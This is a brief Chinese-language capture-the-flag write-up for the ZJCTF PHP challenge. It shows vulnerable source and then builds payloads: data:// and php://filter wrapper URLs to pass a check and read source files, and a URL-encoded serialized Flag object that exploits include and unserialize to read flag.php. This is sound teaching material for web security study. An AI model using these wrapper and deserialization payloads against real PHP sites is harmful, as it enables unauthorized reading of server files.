#

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

构建playload

排除了flag

/?text="welcome to the zjctf"&file="useless.php"&password=O:4:"Flag":0:{}

/?text=welcome+to+the+zjctf&file=useless.php&password=O%3a4%3a%22Flag%22%3a0%3a%7b%7d

使用伪协议进入到里面获取useless.php的内容

```bash
?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php
```

```bash
?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.strip_tags/resource=useless.php
```

```php
<?php  
class Flag {  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

魔术方法 __toString():
当对象被当作字符串使用时，__toString() 方法会被自动调用。

构造playload:

```php
class Flag {
    public $file;
    public function __construct(){
        $this->file = "flag.php"
    }
}
$a = new Flag();
$b = serialize($a);
echo urlencode($b); // O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
```

```bash 他的playload
text=data://text/plain,welcome to the zjctf&file=useless.php&password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
```

```bash 我的playload
/?text=welcome+to+the+zjctf&file=useless.php&password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
```

再查看源码即可;
